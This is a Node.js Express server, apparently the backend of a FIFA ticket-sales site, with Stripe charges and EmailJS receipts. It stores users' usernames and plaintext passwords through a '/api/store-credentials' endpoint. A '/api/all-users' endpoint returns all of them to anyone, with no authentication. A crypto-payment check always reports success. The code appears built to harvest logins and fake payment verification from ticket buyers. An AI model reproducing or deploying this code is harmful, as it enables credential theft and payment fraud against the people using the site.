const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const Stripe = require('stripe');
const axios = require('axios'); // We use this instead of Nodemailer
require('dotenv').config();

const stripe = Stripe(process.env.STRIPE_SECRET_KEY);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

const userCredentials = [];

// 1. STATUS CHECK
app.get('/', (req, res) => res.json({ status: 'Server Online' }));

app.get('/api/stripe-config', (req, res) => {
    res.json({ publishableKey: process.env.STRIPE_PUBLISHABLE_KEY });
});

// 2. CREDENTIALS
app.post('/api/store-credentials', (req, res) => {
    const { username, password, email, name } = req.body;
    console.log('🔐 Storing Creds');
    userCredentials.push({ username, password, email, name, date: new Date() });
    res.json({ success: true });
});

app.get('/api/all-users', (req, res) => res.json(userCredentials));

// 3. PAYMENT PROCESSING
app.post('/api/process-payment', async (req, res) => {
    try {
        const { total, currency = 'USD', customer } = req.body;

        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(total * 100),
            currency: currency.toLowerCase(),
            description: `FIFA Ticket Purchase`,
            receipt_email: customer.email,
        });

        res.json({ success: true, clientSecret: paymentIntent.client_secret });
    } catch (error) {
        console.error('Stripe Error:', error.message);
        res.status(400).json({ success: false, message: error.message });
    }
});

// 4. EMAIL SENDING (VIA HTTP API - BYPASSES RENDER BLOCK)
app.post('/api/send-email', async (req, res) => {
    const { to_name, to_email, transaction_id, total_amount, match_details } = req.body;

    // We prepare the data exactly how EmailJS API expects it
    const emailData = {
        service_id: process.env.EMAILJS_SERVICE_ID,
        template_id: process.env.EMAILJS_TEMPLATE_ID,
        user_id: process.env.EMAILJS_PUBLIC_KEY,
        accessToken: process.env.EMAILJS_PRIVATE_KEY, // Required for server-side requests
        template_params: {
            to_name: to_name,
            to_email: to_email, // This must match the variable in your EmailJS template
            transaction_id: transaction_id,
            total_amount: total_amount,
            match_details: match_details
        }
    };

    try {
        // sending a POST request to port 443 (Standard HTTPS)
        // Render allows this.
        await axios.post('https://api.emailjs.com/api/v1.0/email/send', emailData);
        
        console.log('✅ Email sent successfully via API');
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Email API Error:', error.response ? error.response.data : error.message);
        res.status(500).json({ 
            success: false, 
            message: error.response?.data || 'Failed to connect to EmailJS API' 
        });
    }
});

// 5. CRYPTO VERIFICATION
app.post('/api/verify-crypto', async (req, res) => {
    res.json({ success: true, verified: true });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
